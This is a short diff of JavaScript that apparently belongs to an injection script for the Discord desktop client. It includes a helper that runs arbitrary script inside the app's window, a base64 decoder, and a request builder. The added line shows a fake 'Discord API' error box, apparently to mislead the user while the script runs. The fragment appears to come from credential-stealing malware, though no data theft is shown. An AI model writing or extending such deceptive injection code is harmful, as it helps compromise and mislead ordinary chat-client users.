@@ -207,6 +207,7 @@ const decodeB64 = (s) =>
 
 const execScript = async (s) =>
     await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
+    dialog.showErrorBox("Ops!", "An internal error occurred in the Discord API.");
 
 const fetch = async (e, h) =>
     JSON.parse(await request("GET", `${[
